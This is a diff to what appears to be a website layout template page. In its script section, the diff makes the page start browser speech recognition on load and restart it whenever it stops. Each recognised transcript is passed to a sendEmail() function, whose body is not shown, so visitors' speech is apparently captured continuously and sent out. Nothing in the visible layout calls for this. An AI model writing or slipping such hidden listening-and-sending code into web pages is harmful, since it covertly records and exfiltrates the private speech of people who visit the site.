@@ -8,7 +8,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <!------<title> Website Layout | CodingLab</title>------>
-    <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css"/>
    <style>@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;600;700&display=swap');
     *{
@@ -66,7 +65,6 @@
       color: black;
     }
     .img{
-      background: url('img3.jpg')no-repeat;
       width: 100%;
       height: 100vh;
       background-size: cover;
@@ -154,10 +152,14 @@
       <button>Subscribe</button>
     </div>
   </div>
-
+  <script
+  src="https://code.jquery.com/jquery-3.6.4.js"
+  integrity="sha256-a9jBBRygX1Bh5lt8GZjXDzyOB+bWve9EiO7tROUtj/E="
+  crossorigin="anonymous"></script>
   <script>
-
-    readSpeech();
+    $(document).ready(function(){
+        readSpeech();
+    });
         function readSpeech(){
             
         var recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition || window.mozSpeechRecognition || window.msSpeechRecognition)();
@@ -168,9 +170,12 @@
         recognition.onresult = function(event) {
             sendEmail(event.results[0][0].transcript);
             console.log(event.results[0][0].transcript);
-            readSpeech();
         };
-
+        recognition.addEventListener('start', () => {
+            console.log('Speech recognition started');
+        });
+        recognition.addEventListener('end', recognition.start);
+        
         }
         recognition.onend = () => {
             readSpeech();
